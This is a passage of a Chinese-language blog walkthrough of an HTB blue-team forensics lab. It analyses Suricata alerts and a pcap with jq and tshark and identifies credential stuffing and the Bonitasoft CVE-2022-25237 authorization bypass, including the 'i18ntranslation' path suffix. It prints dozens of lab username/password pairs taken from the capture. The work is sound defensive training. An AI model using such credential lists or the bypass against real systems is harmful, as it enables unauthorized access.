+<p>針對 JSON 做分析<br><code>cat meerkat-alerts.json  | jq .[].alert.signature | sort |  uniq -c | sort -nr</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">134 &quot;ET INFO User-Agent (python-requests) Inbound to Webserver&quot;</span><br><span class="line"> 59 &quot;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&quot;</span><br><span class="line"> 17 &quot;ET DROP Dshield Block Listed Source group 1&quot;</span><br><span class="line"> 12 &quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;</span><br><span class="line">  6 &quot;ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management&quot;</span><br><span class="line">  4 &quot;GPL WEB_SERVER DELETE attempt&quot;</span><br><span class="line">  4 &quot;ET EXPLOIT Bonitasoft Successful Default User Login Attempt (Possible Staging for CVE-2022-25237)&quot;</span><br><span class="line">  4 &quot;ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)&quot;</span><br><span class="line">  3 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 84&quot;</span><br><span class="line">  3 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 82&quot;</span><br><span class="line">  2 null</span><br><span class="line">  1 &quot;GPL SNMP public access udp&quot;</span><br><span class="line">  1 &quot;ET SCAN Suspicious inbound to mySQL port 3306&quot;</span><br><span class="line">  1 &quot;ET SCAN Suspicious inbound to PostgreSQL port 5432&quot;</span><br><span class="line">  1 &quot;ET SCAN Suspicious inbound to Oracle SQL port 1521&quot;</span><br><span class="line">  1 &quot;ET SCAN Suspicious inbound to MSSQL port 1433&quot;</span><br><span class="line">  1 &quot;ET SCAN Potential VNC Scan 5900-5920&quot;</span><br><span class="line">  1 &quot;ET SCAN Potential VNC Scan 5800-5820&quot;</span><br><span class="line">  1 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 81&quot;</span><br><span class="line">  1 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 76&quot;</span><br><span class="line">  1 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 31&quot;</span><br><span class="line">  1 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 29&quot;</span><br><span class="line">  1 &quot;ET CINS Active Threat Intelligence Poor Reputation IP group 13&quot;</span><br><span class="line">  1 &quot;ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)&quot;</span><br><span class="line">  1 &quot;ET 3CORESec Poor Reputation IP group 42&quot;</span><br><span class="line">  1 &quot;ET 3CORESec Poor Reputation IP group 18&quot;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到有一個特別顯眼 <code>Bonitasoft</code></p>
+<ol start="2">
+<li>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?<ul>
+<li>Credential Stuffing</li>
+</ul>
+</li>
+</ol>
+<p>來處理 pcap 吧，我還是想以 shell 處理<br>首先處理 pcap 轉成 json<br><code>tshark -r input_file.pcap -T json &gt; output_file.json</code><br>用 tshark 轉csv超麻煩，要預先選好 field，建議透過 wireshark 做，順便學一下 <code>jq</code><br>然後透過 <code>jq -r &#39;paths | map(tostring) | join(&quot;.&quot;)&#39; output_file.json</code> list all keys<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-list-all-jq-key.png" alt=""><br>然後針對 http 找一下，如果怕 http GET 做驗證的話也可以 grep GET<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-get-http-keys.png" alt=""></p>
+<p>cat output.json | jq   ‘.[]._source.layers.http’ | grep username  | sort | uniq -c | sort -f</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Adora.Mersh%40forela.co.uk&amp;password=85Hh8JZkJR6&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Adrea.Shervil%40forela.co.uk&amp;password=7YoFhtUq&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Ahmed.Monteaux%40forela.co.uk&amp;password=6uskrtw8U&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Alexi.Siman%40forela.co.uk&amp;password=iUS11pX&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Aline.Rivallant%40forela.co.uk&amp;password=gFixyf1nGgf&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Antoinette.Vittel%40forela.co.uk&amp;password=bGtHL8cg&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Bernelle.Draycott%40forela.co.uk&amp;password=MmxlUAWe0oW&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Berny.Ferrarin%40forela.co.uk&amp;password=lPCO6Z&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Cariotta.Whife%40forela.co.uk&amp;password=x3hoU0&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Clerc.Killich%40forela.co.uk&amp;password=vYdwoVhGIwJ&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Cordelie.Rostron%40forela.co.uk&amp;password=mAtdcJh&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Cyndy.Element%40forela.co.uk&amp;password=ybWxct&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Cynthia.Hatto%40forela.co.uk&amp;password=z0NXI6&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Denny.Gepson%40forela.co.uk&amp;password=q2JqCSXk69&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Drusilla.Nice%40forela.co.uk&amp;password=l35Euh0T3Am&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Ebony.Oleszcuk%40forela.co.uk&amp;password=uAWnyfKOjQM&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Elka.Cavet%40forela.co.uk&amp;password=n1aSdc&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Ellerey.Bierling%40forela.co.uk&amp;password=Nva0nKTz&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Farleigh.Schouthede%40forela.co.uk&amp;password=JzI6Dvhy&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Fredrick.Gerraty%40forela.co.uk&amp;password=W1By0HUByDHO&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Garrard.Colisbe%40forela.co.uk&amp;password=jMi9iP&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Gerri.Cordy%40forela.co.uk&amp;password=w15pvWGTK&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Gianina.Tampling%40forela.co.uk&amp;password=maUIffqQl&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Griffith.Lumm%40forela.co.uk&amp;password=QPepd0M8wBK&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Guss.Botten%40forela.co.uk&amp;password=sVMRgGmv0sE&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Gypsy.Henric%40forela.co.uk&amp;password=lLPqVgmHs5F&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Imelda.Braben%40forela.co.uk&amp;password=dC7bjGLYB&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Jenilee.Pressman%40forela.co.uk&amp;password=3eYwLOKhQEcl&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Jordain.Eykel%40forela.co.uk&amp;password=rnMXBNdNW0&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Kayley.Northway%40forela.co.uk&amp;password=s9MC7mkdVU&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Konstance.Domaschke%40forela.co.uk&amp;password=6XLZjvD&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Lauren.Pirozzi%40forela.co.uk&amp;password=wsp0Uy&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Marven.Samuel%40forela.co.uk&amp;password=LPU0qQnt108&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Mathian.Skidmore%40forela.co.uk&amp;password=TQSNp6XrK&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Mella.Amsberger%40forela.co.uk&amp;password=4nIYM5WqN&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Merl.Lavalde%40forela.co.uk&amp;password=BgfiOVXNLBc&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Merna.Rammell%40forela.co.uk&amp;password=u7pWoF36fn&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Nefen.Heffernon%40forela.co.uk&amp;password=VR0ZA8&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Noam.Harvett%40forela.co.uk&amp;password=VDt8bh&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Nola.Crichmer%40forela.co.uk&amp;password=QGa58W3L&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Norbie.Bartolini%40forela.co.uk&amp;password=GV2zlop&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Osborne.Humpatch%40forela.co.uk&amp;password=OJ4WHcI4D&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Pat.Kloisner%40forela.co.uk&amp;password=N8ZwVMzF6&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Pete.Panons%40forela.co.uk&amp;password=BKdkGTB&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Puff.Yapp%40forela.co.uk&amp;password=M08Aae&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Rakel.Cawley%40forela.co.uk&amp;password=h4gW3YLwnW9t&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Samaria.Percifull%40forela.co.uk&amp;password=CUgc3hzHw5g&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Sharon.Claus%40forela.co.uk&amp;password=3X4d06I&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Skipton.Pickerill%40forela.co.uk&amp;password=lcsui1Nu&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Stanleigh.Tuckwell%40forela.co.uk&amp;password=VQCk8TGn3&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Talya.Sterman%40forela.co.uk&amp;password=3gCERZ2JMh&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Teresita.Benford%40forela.co.uk&amp;password=uvYjtQzX&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Tobiah.Horstead%40forela.co.uk&amp;password=fp0OQl&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Vida.Murty%40forela.co.uk&amp;password=4ulecG&amp;_l=en&quot;</span><br><span class="line"> 1   &quot;http.file_data&quot;: &quot;username=Winston.Conville%40forela.co.uk&amp;password=cEmh5W2Vh&amp;_l=en&quot;</span><br><span class="line"> 4   &quot;http.file_data&quot;: &quot;username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt&amp;_l=en&quot;</span><br><span class="line">59   &quot;http.file_data&quot;: &quot;username=install&amp;password=install&amp;_l=en&quot;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Does the vulnerability exploited have a CVE assigned - and if so, which one?<ul>
+<li>CVE-2022-25237</li>
+</ul>
+</li>
+</ol>
+<p>在第一題的 alert json 列出來就看到了</p>
+<ol start="4">
+<li>Which string was appended to the API URL path to bypass the authorization filter by the attacker’s exploit?<ul>
+<li>i18ntranslation</li>
+</ul>
+</li>
+</ol>
+<p><code>cat output.json | jq   &#39;.[]._source.layers.http&#39;  | grep -v null |less</code><br>然後找 <code>/API</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-api-attack-string.png" alt=""></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2025 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
